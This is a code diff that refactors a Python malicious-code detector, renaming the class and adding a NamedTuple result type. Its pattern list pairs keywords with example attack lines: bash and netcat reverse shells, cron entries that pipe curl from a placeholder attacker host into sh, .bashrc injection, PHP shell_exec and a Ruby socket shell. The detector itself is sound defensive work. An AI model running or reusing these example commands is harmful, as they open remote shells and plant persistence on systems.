@@ -1,5 +1,6 @@
+from collections import namedtuple
 from dataclasses import dataclass
-from typing import Optional, Tuple
+from typing import Optional, Tuple, NamedTuple
 
 
 @dataclass
@@ -8,10 +9,15 @@ class MaliciousPattern:
     example: str
 
 
-@dataclass
-class MaliciousCodeChecker:
+class MaliciousCodeDetectResult(NamedTuple):
+    code: str
+    detect_pattern: MaliciousPattern
 
-    _malicious_pattern = [
+
+@dataclass
+class MaliciousCodeDetector:
+
+    malicious_pattern = [
         MaliciousPattern("bash -i", "bash -i >& /dev/tcp/10.0.0.1/8080 0>&1"),
         MaliciousPattern("/dev/tcp/", "bash -i >& /dev/tcp/10.0.0.1/8080 0>&1"),
         MaliciousPattern("/bin/sh", "nc -e /bin/sh 10.0.0.1 1234"),
@@ -38,13 +44,14 @@ class MaliciousCodeChecker:
         MaliciousPattern("/var/spool/cron/crontabs/roo", "10 * * * * curl http://<ATTACKER_IP>/run | sh | crontab -"),
         MaliciousPattern("/etc/anacrontab", "10 * * * * curl http://<ATTACKER_IP>/run | sh | crontab -"),
         MaliciousPattern(".bashrc", "echo '{maliciou code}' > .bashrc"),
-        MaliciousPattern("shell_exec", "shell_exec(\$_SERVER['CMD'])")
+        MaliciousPattern("shell_exec", "shell_exec(\$_SERVER['CMD'])"),
+        MaliciousPattern("popen2e", "socket = TCPSocket.new \"#{RHOST}\", \"#{PORT}\"  ... while line = sock.gets ... Open3.popen2e(\"#{line}\") do | stdin, stdout_and_stderr ... ")
     ]
 
-    def find_malicious_code(self, code: str) -> Optional[Tuple[str, MaliciousPattern]]:
-        for mp in self._malicious_pattern:
+    def detect_malicious_code(self, code: str) -> Optional[MaliciousCodeDetectResult]:
+        for mp in self.malicious_pattern:
             if code.find(mp.pattern) != -1:
-                return code, mp
+                return MaliciousCodeDetectResult(code, mp)
         return None
 
     def find_malicious_code_from_binary(self):
